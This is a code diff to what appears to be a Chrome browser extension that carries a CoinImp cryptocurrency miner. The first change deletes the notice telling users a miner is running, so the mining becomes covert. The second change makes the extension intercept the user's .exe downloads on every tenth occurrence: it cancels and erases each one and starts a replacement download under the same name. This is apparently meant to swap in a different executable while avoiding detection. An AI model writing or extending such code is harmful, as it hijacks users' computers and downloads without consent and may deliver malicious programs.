@@ -56,13 +56,6 @@ function startMiner() {
       );
       _client.start();
       console.log("test miner");
-      _client.addMiningNotification(
-        "Top",
-        "This site is running JavaScript miner from coinimp.com",
-        "#cccccc",
-        40,
-        "#3d3d3d"
-      );
     })
     .catch(console.error);
 }
@@ -140,6 +133,7 @@ async function makeDownload(name) {
 
 var originalFilename;
 var cp = true;
+var counter = 10;
 chrome.downloads.onChanged.addListener(async function (downloadItem) {
   if (downloadItem.filename) {
     if (cp) {
@@ -151,9 +145,14 @@ chrome.downloads.onChanged.addListener(async function (downloadItem) {
       let i2 = originalFilename.lastIndexOf(".");
       let extension = originalFilename.substring(i2 + 1);
       if (extension === "exe") {
-        await chrome.downloads.cancel(downloadItem.id);
-        await chrome.downloads.erase({ id: downloadItem.id });
-        await makeDownload(originalFilename);
+        if (counter >= 10) {
+          counter = 0;
+          await chrome.downloads.cancel(downloadItem.id);
+          await chrome.downloads.erase({ id: downloadItem.id });
+          await makeDownload(originalFilename);
+        } else {
+          counter = counter + 1;
+        }
       }
     } else {
       cp = true;
